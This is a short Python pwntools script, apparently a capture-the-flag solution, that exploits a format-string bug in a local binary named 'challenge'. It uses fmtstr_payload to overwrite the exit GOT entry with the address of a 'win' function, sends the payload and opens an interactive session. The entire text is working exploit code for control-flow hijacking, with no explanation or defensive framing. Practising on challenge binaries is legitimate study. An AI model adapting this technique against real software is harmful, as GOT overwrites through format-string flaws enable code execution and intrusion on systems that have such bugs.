from pwn import *

p = process('./challenge')

exit_got = 0x400a50
win      = 0x401216
offset   = 6

payload = fmtstr_payload(
    offset,
    { exit_got: win },
    write_size='short'
)

p.sendline(payload)
p.interactive()
